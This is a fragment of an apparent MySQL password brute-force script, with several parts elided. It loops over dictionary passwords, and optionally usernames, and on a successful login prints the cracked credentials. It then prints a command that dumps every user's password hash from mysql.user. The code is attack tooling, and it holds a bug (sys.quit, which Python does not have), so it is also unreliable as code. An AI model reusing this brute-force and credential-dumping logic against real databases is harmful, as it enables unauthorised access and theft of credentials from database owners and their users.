                ...
                for line in iter(p.stdout.readline, ''):
                    if line.startswith("Database"):
                        if self.options.force == True:
                            print("[+] We are in !")
                            print("[+] Username: '%s' have the following password: '%s'  " % (
                            users.strip("\n"), elem.strip("\n")))
                            print("\t[+] Execute this string to get list of users:")
                            print("\t\t[+] mysql -u%s -p%s -e\"select user,password from mysql.user;\"" % (
                            users.strip("\n"), elem.strip("\n")))
                            print("Done!")
                            sys.quit(1)
                        else:
        ...
        for elem in self.dict:
            ...
            for line in iter(p.stdout.readline, ''):
                if line.startswith("Database"):
                    print("[+] We are in !")
                    print("[+] Username: '%s' have the following password: '%s'  " % (
                    self.options.username, elem.strip("\n")))
                    print("\t[+] Execute this string to get list of users:")
                    print("\t\t[+] mysql -u%s -p%s -e\"select user,password from mysql.user;\"" % (
                    self.options.username, elem.strip("\n")))
            for line in iter(p.stderr.readline, ''):
...
def main():
    ...
    if options.username is not None and options.dictionary_usernames == None:
